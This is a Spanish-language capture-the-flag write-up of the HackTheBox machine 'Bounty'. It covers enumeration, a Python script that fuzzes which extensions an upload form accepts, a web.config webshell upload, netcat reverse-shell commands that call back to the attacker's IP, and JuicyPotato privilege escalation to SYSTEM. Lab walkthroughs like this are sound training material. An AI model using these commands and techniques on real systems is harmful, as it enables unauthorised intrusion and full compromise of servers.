---
title:  "Bounty Writeup [ES] - HackTheBox"
date:   2022-06-07 18:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: []
image:
  src: /images/HTB/Bounty/00-banner.png
  width: 620
  height: 410
---

# Resumen

En esta ocasión estaremos resolviendo la máquina [Bounty](https://app.hackthebox.com/machines/142) de la plataforma [HackTheBox](https://app.hackthebox.com/home). Bounty es una máquina Windows de dificultad Easy en donde encontraremos una página web simple con una subida de archivos que nos permitirá ejecutar comandos utilizando un archivo con extension ```.config```. Una vez dentro podremos explotar el token **SeImpersonatePrivilege** para escalar privilegios.

---
# Enumeración

## Nmap

En esta fase utilizaremos los siguientes scripts personalizados.

> **nmap-scan.sh**: Realiza SYN-SCAN a los 65535 puertos y deposita el output al archivo ```allPorts.gnmap```

> **nmap-services.sh**: Lee y parsea un archivo "grepeable" de nmap  obtiene IP y puertos para realizar un escaneo de servicios a estos últimos.

* ```sudo nmap-scan.sh 10.129.130.45```
* ```nmap-services.sh allPorts.gnmap```

```plaintext
# Nmap 7.92 scan initiated Mon Jun  6 17:11:22 2022 as: nmap -sCV -p80 -n -Pn -oN tcp-ports.nmap 10.129.130.45
Nmap scan report for 10.129.130.45
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  6 17:11:33 2022 -- 1 IP address (1 host up) scanned in 10.38 seconds
```

Solamente se detecta el puerto 80/tcp abierto.

## Enumeración Web

Investigando la página web nos encontramos con una imagen de merlín y podemos identificar que estamos ante un servidor web **IIS 7.5** como fué reportado anteriormente por nmap. Adicionalmente vemos que la web está construida con **ASP.NET**.

![](/images/HTB/Bounty/10-website.png)

Sin mucho más que ver, procederemos a lanzar un escaneo de directorios con **gobuster**. Encontramos la ruta ```/UploadedFiles``` a la cual no podremos acceder de momento.

![](/images/HTB/Bounty/12-gobuster-first-scan.png)

Continuando, y sabiendo que el servidor trabaja con ASP.NET podríamos buscar archivos con extensión ```.asp``` y ```.aspx```.

![](/images/HTB/Bounty/15-transfer-file.png)

Se encuentra el archivo ```/transfer.aspx``` el cual resulta ser un panel de subida de archivos.

![](/images/HTB/Bounty/18-upload-panel.png)

Para hacer una prueba, he creado un archivo llamado "test.txt" y lo he subido. El servidor nos responde con el resultado: **Invalid File. Please try again**.

![](/images/HTB/Bounty/22-invalid-file.png)

Si interceptamos la petición, podemos ver que aislado a nuestro archivo, la web está enviando por ```POST``` otros tres parámetros.

*   ```__VIEWSTATE```
*   ```__EVENTVALIDATION```
*   ```btnUpload```

![](/images/HTB/Bounty/20-intercept-upload.png)

Con esta información ya podemos empezar a crear un script en **python3** que se encargue de chequear las extensiones válidas. Para esto utilizaremos el dicionario [raft-medium-extensions-lowercase.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-extensions-lowercase.txt) perteneciente a [SecLists](https://github.com/danielmiessler/SecLists).


```python
#!/usr/bin/python3
from pwn import *
from tqdm import tqdm
import requests, signal

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

#CTRL + C
signal.signal(signal.SIGINT, def_handler)

upload_url = "http://10.129.130.45/transfer.aspx"

postData = {
    "__VIEWSTATE" : "/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRksqYUgKdyvg/NDIxFs0Vxctek1/A=",
    "__EVENTVALIDATION" : "/wEWAgKZuIe3CALt3oXMA5mYEcMuakjG7239K1F3C/62+kJq",
    "btnUpload" : "Upload"
}

allowedExt = []
p1 = log.progress("Testing extension")

with open("raft-medium-extensions-lowercase.txt", "r") as extensions:
    for line in tqdm(extensions.readlines()):
        extension = line.strip()
        p1.status(extension)
        myFile = {'FileUpload1': ('test{}'.format(extension), 'testing!')}
        r = requests.post(upload_url, data=postData, files=myFile)
        
        if 'Invalid File' not in r.text:
            allowedExt.append(extension)
    allowedExtStr = ' '.join(str(e) for e in allowedExt)
    log.info("Allowed extensions: {}".format(allowedExtStr))
    p1.success("Completed")
```
{: file="upload.py" }

> Como se puede apreciar en el script, el contenido de las variables ```__VIEWSTATE``` y ```__EVENTVALIDATION``` se encuentran hardcodeados, esto es porque en esta web en particular estos valores no cambian, lo normal sería que fueran dinámicos y se deban capturar con expresiones regulares u otro método.

Ejecutamos ```upload.py```.

![](/images/HTB/Bounty/35-allowed-extensions-python.png)

Al cabo de unos minutos obtendremos todas las extensiones válidas encontradas dentro del diccionario. De las encontradas ```.config``` llama inmediatamente la atención. Según [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services) es posible ejecutar comandos a través de un archivo con esta extensión.

![](/images/HTB/Bounty/36-config-info.png)

Para esto, crearemos un archivo ```web.config``` utilizando una [webshell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) del repositorio [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) y la subiremos a la máquina.

---
# Consola como merlin

Para la intrusión, ya asumiendo que podemos ejecutar comandos, nos entablaremos una reverse shell utilizando ```nc.exe``` compartido a través de **smb**. Para localizar el archivo, podemos intuir que este se encuentra en la ruta ```/uploadedFiles``` encontrada anteriormente en la fase de enumeración.

![](/images/HTB/Bounty/37-reverse-shell.png)

Paralelamente tendremos:

1. Un recurso compartido en smb llamado ```shared```
2. Una sesión a la escucha de netcat por el puerto 443

Ejecutamos ```\\10.10.14.90\shared\nc.exe -e cmd 10.10.14.90 443``` en la webshell y obtendremos una consola como el usuario **merlin**.

![](/images/HTB/Bounty/38-reverse-shell.png)

---
# Consola como Admin

Ya una vez dentro, realizando una enumeración básica, podemos ver que el usuario merlin posee privilegio **SeImpersonatePrivilege** que nos permite ejecutar comandos como Administrador utilizando herramientas como [JuicyPotato](https://github.com/ohpe/juicy-potato) o [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

![](/images/HTB/Bounty/42-impersonate-token.png)

Descargamos **JuicyPotato.exe** desde su repositorio en Github y lo transferimos a la máquina. Una vez con esto hecho, utilizaremos **netcat** nuevamente para obtener una nueva consola, esta vez como ```nt authority\system```.

* ```JuicyPotato.exe -l 1337 -t * -p cmd.exe -a "/c \\10.10.14.90\shared\nc.exe -e cmd 10.10.14.90 1443"```

![](/images/HTB/Bounty/45-root-user.png)

Finalmente buscaremos las flags, la de root se encuentra sin problemas en la ubicación usual.

![](/images/HTB/Bounty/48-flags.png)

La flag del usuario podremos encontrarla con el commando ```attrib``` o ```dir -Force``` ya que se encuentra oculta.

![](/images/HTB/Bounty/49-flags.png)

Y eso sería todo para esta máquina.

![](/images/HTB/Bounty/100-pwned.png)

> ¡Happy Hacking and keep grinding!

---
# Recursos

* [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)
* [https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
* Abusing Tokens - Hacktricks: [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)